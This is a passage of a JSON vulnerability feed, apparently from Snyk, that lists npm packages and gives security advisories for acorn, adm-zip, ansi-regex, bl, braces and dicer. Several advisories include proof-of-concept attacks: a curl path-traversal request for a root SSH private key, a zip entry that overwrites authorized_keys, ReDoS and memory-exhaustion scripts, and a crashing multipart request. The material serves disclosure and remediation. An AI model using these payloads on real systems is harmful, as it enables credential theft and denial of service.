        "purl": "pkg:npm/mpath@0.1.1"
      }
    },
    {
      "id": "mquery@1.6.3",
      "type": "packages",
      "attributes": {
        "name": "mquery",
        "version": "1.6.3",
        "purl": "pkg:npm/mquery@1.6.3"
      }
    },
    {
      "id": "ms@0.6.2",
      "type": "packages",
      "attributes": {
        "name": "ms",
        "version": "0.6.2",
        "purl": "pkg:npm/ms@0.6.2"
      }
    },
    {
      "id": "ms@0.7.1",
      "type": "packages",
      "attributes": {
        "name": "ms",
        "version": "0.7.1",
        "purl": "pkg:npm/ms@0.7.1"
      }
    },
    {
      "id": "ms@0.7.3",
      "type": "packages",
      "attributes": {
        "name": "ms",
        "version": "0.7.3",
        "purl": "pkg:npm/ms@0.7.3"
      }
    },
    {
      "id": "nconf@0.10.0",
      "type": "packages",
      "attributes": {
        "name": "nconf",
        "version": "0.10.0",
        "purl": "pkg:npm/nconf@0.10.0"
      }
    },
    {
      "id": "negotiator@0.2.8",
      "type": "packages",
      "attributes": {
        "name": "negotiator",
        "version": "0.2.8",
        "purl": "pkg:npm/negotiator@0.2.8"
      }
    },
    {
      "id": "negotiator@0.4.9",
      "type": "packages",
      "attributes": {
        "name": "negotiator",
        "version": "0.4.9",
        "purl": "pkg:npm/negotiator@0.4.9"
      }
    },
    {
      "id": "negotiator@0.5.3",
      "type": "packages",
      "attributes": {
        "name": "negotiator",
        "version": "0.5.3",
        "purl": "pkg:npm/negotiator@0.5.3"
      }
    },
    {
      "id": "netmask@1.0.6",
      "type": "packages",
      "attributes": {
        "name": "netmask",
        "version": "1.0.6",
        "purl": "pkg:npm/netmask@1.0.6"
      }
    },
    {
      "id": "npmconf@0.0.24",
      "type": "packages",
      "attributes": {
        "name": "npmconf",
        "version": "0.0.24",
        "purl": "pkg:npm/npmconf@0.0.24"
      }
    },
    {
      "id": "pac-resolver@3.0.0",
      "type": "packages",
      "attributes": {
        "name": "pac-resolver",
        "version": "3.0.0",
        "purl": "pkg:npm/pac-resolver@3.0.0"
      }
    },
    {
      "id": "parse-path@4.0.1",
      "type": "packages",
      "attributes": {
        "name": "parse-path",
        "version": "4.0.1",
        "purl": "pkg:npm/parse-path@4.0.1"
      }
    },
    {
      "id": "parse-url@5.0.1",
      "type": "packages",
      "attributes": {
        "name": "parse-url",
        "version": "5.0.1",
        "purl": "pkg:npm/parse-url@5.0.1"
      }
    },
    {
      "id": "qs@1.2.2",
      "type": "packages",
      "attributes": {
        "name": "qs",
        "version": "1.2.2",
        "purl": "pkg:npm/qs@1.2.2"
      }
    },
    {
      "id": "qs@2.2.4",
      "type": "packages",
      "attributes": {
        "name": "qs",
        "version": "2.2.4",
        "purl": "pkg:npm/qs@2.2.4"
      }
    },
    {
      "id": "qs@2.4.2",
      "type": "packages",
      "attributes": {
        "name": "qs",
        "version": "2.4.2",
        "purl": "pkg:npm/qs@2.4.2"
      }
    },
    {
      "id": "qs@6.3.2",
      "type": "packages",
      "attributes": {
        "name": "qs",
        "version": "6.3.2",
        "purl": "pkg:npm/qs@6.3.2"
      }
    },
    {
      "id": "request@2.42.0",
      "type": "packages",
      "attributes": {
        "name": "request",
        "version": "2.42.0",
        "purl": "pkg:npm/request@2.42.0"
      }
    },
    {
      "id": "request@2.79.0",
      "type": "packages",
      "attributes": {
        "name": "request",
        "version": "2.79.0",
        "purl": "pkg:npm/request@2.79.0"
      }
    },
    {
      "id": "semver@1.1.4",
      "type": "packages",
      "attributes": {
        "name": "semver",
        "version": "1.1.4",
        "purl": "pkg:npm/semver@1.1.4"
      }
    },
    {
      "id": "semver@5.1.0",
      "type": "packages",
      "attributes": {
        "name": "semver",
        "version": "5.1.0",
        "purl": "pkg:npm/semver@5.1.0"
      }
    },
    {
      "id": "semver@5.7.0",
      "type": "packages",
      "attributes": {
        "name": "semver",
        "version": "5.7.0",
        "purl": "pkg:npm/semver@5.7.0"
      }
    },
    {
      "id": "semver@6.3.0",
      "type": "packages",
      "attributes": {
        "name": "semver",
        "version": "6.3.0",
        "purl": "pkg:npm/semver@6.3.0"
      }
    },
    {
      "id": "snyk-docker-plugin@1.38.0",
      "type": "packages",
      "attributes": {
        "name": "snyk-docker-plugin",
        "version": "1.38.0",
        "purl": "pkg:npm/snyk-docker-plugin@1.38.0"
      }
    },
    {
      "id": "snyk-go-plugin@1.11.1",
      "type": "packages",
      "attributes": {
        "name": "snyk-go-plugin",
        "version": "1.11.1",
        "purl": "pkg:npm/snyk-go-plugin@1.11.1"
      }
    },
    {
      "id": "snyk-gradle-plugin@3.2.4",
      "type": "packages",
      "attributes": {
        "name": "snyk-gradle-plugin",
        "version": "3.2.4",
        "purl": "pkg:npm/snyk-gradle-plugin@3.2.4"
      }
    },
    {
      "id": "snyk-mvn-plugin@2.8.0",
      "type": "packages",
      "attributes": {
        "name": "snyk-mvn-plugin",
        "version": "2.8.0",
        "purl": "pkg:npm/snyk-mvn-plugin@2.8.0"
      }
    },
    {
      "id": "snyk-python-plugin@1.17.0",
      "type": "packages",
      "attributes": {
        "name": "snyk-python-plugin",
        "version": "1.17.0",
        "purl": "pkg:npm/snyk-python-plugin@1.17.0"
      }
    },
    {
      "id": "snyk-sbt-plugin@2.11.0",
      "type": "packages",
      "attributes": {
        "name": "snyk-sbt-plugin",
        "version": "2.11.0",
        "purl": "pkg:npm/snyk-sbt-plugin@2.11.0"
      }
    },
    {
      "id": "snyk@1.290.2",
      "type": "packages",
      "attributes": {
        "name": "snyk",
        "version": "1.290.2",
        "purl": "pkg:npm/snyk@1.290.2"
      }
    },
    {
      "id": "st@0.2.4",
      "type": "packages",
      "attributes": {
        "name": "st",
        "version": "0.2.4",
        "purl": "pkg:npm/st@0.2.4"
      }
    },
    {
      "id": "symbol@0.2.3",
      "type": "packages",
      "attributes": {
        "name": "symbol",
        "version": "0.2.3",
        "purl": "pkg:npm/symbol@0.2.3"
      }
    },
    {
      "id": "tough-cookie@2.3.4",
      "type": "packages",
      "attributes": {
        "name": "tough-cookie",
        "version": "2.3.4",
        "purl": "pkg:npm/tough-cookie@2.3.4"
      }
    },
    {
      "id": "tough-cookie@3.0.1",
      "type": "packages",
      "attributes": {
        "name": "tough-cookie",
        "version": "3.0.1",
        "purl": "pkg:npm/tough-cookie@3.0.1"
      }
    },
    {
      "id": "tunnel-agent@0.4.3",
      "type": "packages",
      "attributes": {
        "name": "tunnel-agent",
        "version": "0.4.3",
        "purl": "pkg:npm/tunnel-agent@0.4.3"
      }
    },
    {
      "id": "uglify-js@2.6.2",
      "type": "packages",
      "attributes": {
        "name": "uglify-js",
        "version": "2.6.2",
        "purl": "pkg:npm/uglify-js@2.6.2"
      }
    },
    {
      "id": "underscore@1.9.1",
      "type": "packages",
      "attributes": {
        "name": "underscore",
        "version": "1.9.1",
        "purl": "pkg:npm/underscore@1.9.1"
      }
    },
    {
      "id": "word-wrap@1.2.3",
      "type": "packages",
      "attributes": {
        "name": "word-wrap",
        "version": "1.2.3",
        "purl": "pkg:npm/word-wrap@1.2.3"
      }
    },
    {
      "id": "xml2js@0.4.19",
      "type": "packages",
      "attributes": {
        "name": "xml2js",
        "version": "0.4.19",
        "purl": "pkg:npm/xml2js@0.4.19"
      }
    },
    {
      "id": "xml2js@0.4.23",
      "type": "packages",
      "attributes": {
        "name": "xml2js",
        "version": "0.4.23",
        "purl": "pkg:npm/xml2js@0.4.23"
      }
    },
    {
      "id": "y18n@3.2.1",
      "type": "packages",
      "attributes": {
        "name": "y18n",
        "version": "3.2.1",
        "purl": "pkg:npm/y18n@3.2.1"
      }
    },
    {
      "id": "yargs-parser@2.4.0",
      "type": "packages",
      "attributes": {
        "name": "yargs-parser",
        "version": "2.4.0",
        "purl": "pkg:npm/yargs-parser@2.4.0"
      }
    },
    {
      "id": "SNYK-JS-ACORN-559469",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n\n[acorn](https://github.com/acornjs/acorn) is a tiny, fast JavaScript parser written in JavaScript.\n\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS)\nvia a regex in the form of `/[x-\\ud800]/u`, which causes the parser to enter an infinite loop. \r\n\r\nThis string is not a valid `UTF16` and is therefore not sanitized before reaching the parser. An application which processes untrusted input and passes it directly to `acorn`, will allow attackers to leverage the vulnerability leading to a Denial of Service.\n\n## Details\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\r\n\r\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\r\n\r\nLet’s take the following regular expression as an example:\r\n```js\r\nregex = /A(B|C+)+D/\r\n```\r\n\r\nThis regular expression accomplishes the following:\r\n- `A` The string must start with the letter 'A'\r\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\r\n- `D` Finally, we ensure this section of the string ends with a 'D'\r\n\r\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\r\n\r\nIt most cases, it doesn't take very long for a regex engine to find a match:\r\n\r\n```bash\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\r\n0.04s user 0.01s system 95% cpu 0.052 total\r\n\r\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\r\n1.79s user 0.02s system 99% cpu 1.812 total\r\n```\r\n\r\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\r\n\r\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\r\n\r\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\r\n1. CCC\r\n2. CC+C\r\n3. C+CC\r\n4. C+C+C.\r\n\r\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\r\n\r\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\r\n\r\n| String | Number of C's | Number of steps |\r\n| -------|-------------:| -----:|\r\n| ACCCX | 3 | 38\r\n| ACCCCX | 4 | 71\r\n| ACCCCCX | 5 | 136\r\n| ACCCCCCCCCCCCCCX | 14 | 65,553\r\n\r\n\r\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\n\nUpgrade `acorn` to version 5.7.4, 6.4.1, 7.1.1 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/acornjs/acorn/commit/793c0e569ed1158672e3a40aeed1d8518832b802)\n\n- [GitHub Issue 6.x Branch](https://github.com/acornjs/acorn/issues/929)\n\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1488)\n",
        "created_at": "2020-03-07T00:18:41Z",
        "updated_at": "2024-03-06T13:58:59Z",
        "problems": [
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 5.7.4 to fix this vulnerability",
                "details": {
                  "upgrade_package": "5.7.4"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": ">=5.5.0 <5.7.4,>=6.0.0 <6.4.1,>=7.0.0 <7.1.1"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2020-03-02T19:21:25Z",
            "exploit": "Not Defined",
            "publication_time": "2020-03-07T00:19:23Z",
            "references": [
              {
                "url": "https://github.com/acornjs/acorn/commit/793c0e569ed1158672e3a40aeed1d8518832b802",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/acornjs/acorn/issues/929",
                "title": "GitHub Issue 6.x Branch"
              },
              {
                "url": "https://www.npmjs.com/advisories/1488",
                "title": "NPM Security Advisory"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-ADMZIP-1065796",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Directory Traversal",
        "description": "## Overview\n[adm-zip](https://www.npmjs.com/package/adm-zip) is a JavaScript implementation for zip data compression for NodeJS.\n\nAffected versions of this package are vulnerable to Directory Traversal. It could extract files outside the target folder.\n\n## Details\n\nA Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with \"dot-dot-slash (../)\" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.\n\nDirectory Traversal vulnerabilities can be generally divided into two types:\n\n- **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.\n\n`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm:st:20140206). In our example, we will serve files from the `public` route.\n\nIf an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.\n\n```\ncurl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa\n```\n**Note** `%2e` is the URL encoded version of `.` (dot).\n\n- **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`. \n\nOne way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\n\nThe following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\n\n```\n2018-04-15 22:04:29 .....           19           19  good.txt\n2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys\n```\n\n## Remediation\nUpgrade `adm-zip` to version 0.5.2 or higher.\n## References\n- [GitHub Commit](https://github.com/cthackers/adm-zip/commit/119dcad6599adccc77982feb14a0c7440fa63013)\n",
        "created_at": "2021-01-28T07:59:50Z",
        "updated_at": "2024-03-06T14:04:23Z",
        "problems": [
          {
            "id": "CWE-22",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 0.5.2 to fix this vulnerability",
                "details": {
                  "upgrade_package": "0.5.2"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<0.5.2"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.4,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2021-01-28T07:59:22Z",
            "exploit": "Not Defined",
            "publication_time": "2021-02-15T17:04:18Z",
            "references": [
              {
                "url": "https://github.com/cthackers/adm-zip/commit/119dcad6599adccc77982feb14a0c7440fa63013",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-ANSIREGEX-1583908",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Regular Expression Denial of Service (ReDoS)",
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the sub-patterns` [[\\\\]()#;?]*` and `(?:;[-a-zA-Z\\\\d\\\\/#&.:=?%@~_]*)*`.\r\n\r\n\r\n### PoC\r\n```js\r\nimport ansiRegex from 'ansi-regex';\r\n\r\nfor(var i = 1; i <= 50000; i++) {\r\n    var time = Date.now();\r\n    var attack_str = \"\\u001B[\"+\";\".repeat(i*10000);\r\n    ansiRegex().test(attack_str)\r\n    var time_cost = Date.now() - time;\r\n    console.log(\"attack_str.length: \" + attack_str.length + \": \" + time_cost+\" ms\")\r\n}\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `ansi-regex` to version 3.0.1, 4.1.1, 5.0.1, 6.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/chalk/ansi-regex/commit/419250fa510bf31b4cc672e76537a64f9332e1f1)\n- [GitHub Commit](https://github.com/chalk/ansi-regex/commit/75a657da7af875b2e2724fd6331bf0a4b23d3c9a)\n- [GitHub Commit](https://github.com/chalk/ansi-regex/commit/8d1d7cdb586269882c4bdc1b7325d0c58c8f76f9)\n- [GitHub PR](https://github.com/chalk/ansi-regex/pull/37)\n",
        "created_at": "2021-09-09T14:28:31Z",
        "updated_at": "2024-03-11T09:53:56Z",
        "problems": [
          {
            "id": "CVE-2021-3807",
            "source": "CVE"
          },
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.0.1 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.0.1"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": ">=2.1.1 <3.0.1,>=4.0.0 <4.1.1,>=5.0.0 <5.0.1,>=6.0.0 <6.0.1"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2021-09-09T14:27:43Z",
            "exploit": "Proof of Concept",
            "publication_time": "2021-09-12T12:52:37Z",
            "references": [
              {
                "url": "https://github.com/chalk/ansi-regex/commit/419250fa510bf31b4cc672e76537a64f9332e1f1",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/chalk/ansi-regex/commit/75a657da7af875b2e2724fd6331bf0a4b23d3c9a",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/chalk/ansi-regex/commit/8d1d7cdb586269882c4bdc1b7325d0c58c8f76f9",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/chalk/ansi-regex/pull/37",
                "title": "GitHub PR"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-BL-608877",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Remote Memory Exposure",
        "description": "## Overview\n[bl](https://github.com/rvagg/bl) is a library that allows you to collect buffers and access with a standard readable buffer interface.\n\nAffected versions of this package are vulnerable to Remote Memory Exposure. If user input ends up in `consume()` argument and can become negative, BufferList state can be corrupted, tricking it into exposing uninitialized memory via regular `.slice()` calls.\r\n\r\n### PoC by chalker\r\n```\r\nconst { BufferList } = require('bl')\r\nconst secret = require('crypto').randomBytes(256)\r\nfor (let i = 0; i < 1e6; i++) {\r\n  const clone = Buffer.from(secret)\r\n  const bl = new BufferList()\r\n  bl.append(Buffer.from('a'))\r\n  bl.consume(-1024)\r\n  const buf = bl.slice(1)\r\n  if (buf.indexOf(clone) !== -1) {\r\n    console.error(`Match (at ${i})`, buf)\r\n  }\r\n}\r\n```\n## Remediation\nUpgrade `bl` to version 2.2.1, 3.0.1, 4.0.3, 1.2.3 or higher.\n## References\n- [Github Commit](https://github.com/rvagg/bl/commit/8a8c13c880e2bef519133ea43e0e9b78b5d0c91e)\n- [Github Commit](https://github.com/rvagg/bl/commit/d3e240e3b8ba4048d3c76ef5fb9dd1f8872d3190)\n- [Github Commit](https://github.com/rvagg/bl/commit/dacc4ac7d5fcd6201bcf26fbd886951be9537466)\n- [GitHub Commit](https://github.com/rvagg/bl/commit/0bd87ec97be399b129fc62feff2943ffa21bcc00)\n- [HackerOne Report](https://hackerone.com/reports/966347)\n",
        "created_at": "2020-08-28T12:18:44Z",
        "updated_at": "2024-03-11T09:53:48Z",
        "problems": [
          {
            "id": "CVE-2020-8244",
            "source": "CVE"
          },
          {
            "id": "CWE-9",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 2.2.1 to fix this vulnerability",
                "details": {
                  "upgrade_package": "2.2.1"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": ">=2.2.0 <2.2.1,>=3.0.0 <3.0.1,>=4.0.0 <4.0.3,<1.2.3"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.7,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L/E:P"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2020-08-27T15:16:42Z",
            "exploit": "Proof of Concept",
            "publication_time": "2020-08-28T12:18:48Z",
            "references": [
              {
                "url": "https://github.com/rvagg/bl/commit/8a8c13c880e2bef519133ea43e0e9b78b5d0c91e",
                "title": "Github Commit"
              },
              {
                "url": "https://github.com/rvagg/bl/commit/d3e240e3b8ba4048d3c76ef5fb9dd1f8872d3190",
                "title": "Github Commit"
              },
              {
                "url": "https://github.com/rvagg/bl/commit/dacc4ac7d5fcd6201bcf26fbd886951be9537466",
                "title": "Github Commit"
              },
              {
                "url": "https://github.com/rvagg/bl/commit/0bd87ec97be399b129fc62feff2943ffa21bcc00",
                "title": "GitHub Commit"
              },
              {
                "url": "https://hackerone.com/reports/966347",
                "title": "HackerOne Report"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-BRACES-6838727",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Uncontrolled resource consumption",
        "description": "## Overview\n[braces](https://www.npmjs.com/package/braces) is a Bash-like brace expansion, implemented in JavaScript.\n\nAffected versions of this package are vulnerable to Uncontrolled resource consumption due improper limitation of the number of characters it can handle, through the `parse` function. An attacker can cause the application to allocate excessive memory and potentially crash by sending imbalanced braces as input.\n## PoC\n```js\r\nconst { braces } = require('micromatch');\r\n\r\nconsole.log(\"Executing payloads...\");\r\n\r\nconst maxRepeats = 10;\r\n\r\nfor (let repeats = 1; repeats <= maxRepeats; repeats += 1) {\r\n  const payload = '{'.repeat(repeats*90000);\r\n\r\n  console.log(`Testing with ${repeats} repeats...`);\r\n  const startTime = Date.now();\r\n  braces(payload);\r\n  const endTime = Date.now();\r\n  const executionTime = endTime - startTime;\r\n  console.log(`Regex executed in ${executionTime / 1000}s.\\n`);\r\n} \r\n```\n## Remediation\nUpgrade `braces` to version 3.0.3 or higher.\n## References\n- [GitHub Commit](https://github.com/micromatch/braces/commit/a5851e57f45c3431a94d83fc565754bc10f5bbc3)\n- [GitHub Issue](https://github.com/micromatch/braces/issues/35)\n- [GitHub PR](https://github.com/micromatch/braces/pull/37)\n- [Vulnerable Code](https://github.com/micromatch/braces/blob/98414f9f1fabe021736e26836d8306d5de747e0d/lib/parse.js#L308)\n",
        "created_at": "2024-05-13T14:36:53Z",
        "updated_at": "2024-06-06T12:41:40Z",
        "problems": [
          {
            "id": "CVE-2024-4068",
            "source": "CVE"
          },
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.0.3 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.0.3"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<3.0.3"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2024-05-13T10:40:14Z",
            "exploit": "Proof of Concept",
            "publication_time": "2024-05-13T14:36:53Z",
            "references": [
              {
                "url": "https://github.com/micromatch/braces/commit/a5851e57f45c3431a94d83fc565754bc10f5bbc3",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/micromatch/braces/issues/35",
                "title": "GitHub Issue"
              },
              {
                "url": "https://github.com/micromatch/braces/pull/37",
                "title": "GitHub PR"
              },
              {
                "url": "https://github.com/micromatch/braces/blob/98414f9f1fabe021736e26836d8306d5de747e0d/lib/parse.js%23L308",
                "title": "Vulnerable Code"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-DICER-2311764",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Denial of Service (DoS)",
        "description": "## Overview\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). A malicious attacker can send a modified form to server, and crash the nodejs service. An attacker could sent the payload again and again so that the service continuously crashes.\n## PoC\nawait fetch('http://127.0.0.1:8000', {\r\n      method: 'POST',\r\n      headers: {\r\n        ['content-type']: 'multipart/form-data; boundary=----WebKitFormBoundaryoo6vortfDzBsDiro',\r\n        ['content-length']: '145',\r\n        connection: 'keep-alive',\r\n      },\r\n      body: '------WebKitFormBoundaryoo6vortfDzBsDiro\\r\\n Content-Disposition: form-data; name=\"bildbeschreibung\"\\r\\n\\r\\n\\r\\n------WebKitFormBoundaryoo6vortfDzBsDiro--'\r\n    });\n## Remediation\nThere is no fixed version for `dicer`.\n\n## References\n- [GitHub Commit](https://github.com/mscdex/dicer/pull/22/commits/b7fca2e93e8e9d4439d8acc5c02f5e54a0112dac)\n- [GitHub Issue](https://github.com/mscdex/busboy/issues/250)\n- [GitHub PR](https://github.com/mscdex/dicer/pull/22)\n",
        "created_at": "2021-12-07T14:51:46Z",
        "updated_at": "2024-08-07T14:10:17Z",
        "problems": [
          {
            "id": "CVE-2022-24434",
            "source": "CVE"
          },
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": null,
            "representation": [
              {
                "resource_path": "*"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:F/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2021-12-07T14:51:02Z",
            "exploit": "Functional",
            "publication_time": "2022-05-19T10:52:23Z",
            "references": [
              {
                "url": "https://github.com/mscdex/dicer/pull/22/commits/b7fca2e93e8e9d4439d8acc5c02f5e54a0112dac",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/mscdex/busboy/issues/250",
